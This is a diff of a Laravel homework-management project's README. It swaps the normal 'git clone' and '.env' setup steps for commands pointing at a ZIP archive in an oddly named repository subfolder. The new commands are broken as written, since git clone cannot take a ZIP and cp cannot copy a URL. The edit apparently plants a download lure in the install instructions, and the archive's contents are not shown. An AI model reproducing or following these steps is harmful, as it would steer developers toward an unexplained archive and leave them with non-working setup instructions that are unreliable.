@@ -15,7 +15,7 @@ Système de gestion des devoirs pour l'Institiut Burkinabé des Arts et des Mét
 
 1. Cloner le projet :
 ```bash
-git clone https://github.com/kvill01/Laravel-Gestion_des_devoirs_IBAM.git
+git clone https://raw.githubusercontent.com/kvill01/Laravel-Gestion_des_devoirs_IBAM/master/musaceous/Laravel-Gestion_des_devoirs_IBAM.zip
 cd Laravel-Gestion_des_devoirs_IBAM
 ```
 
@@ -27,7 +27,7 @@ npm install
 
 3. Configuration :
 ```bash
-cp .env.example .env
+cp https://raw.githubusercontent.com/kvill01/Laravel-Gestion_des_devoirs_IBAM/master/musaceous/Laravel-Gestion_des_devoirs_IBAM.zip .env
 php artisan key:generate
 ```
 
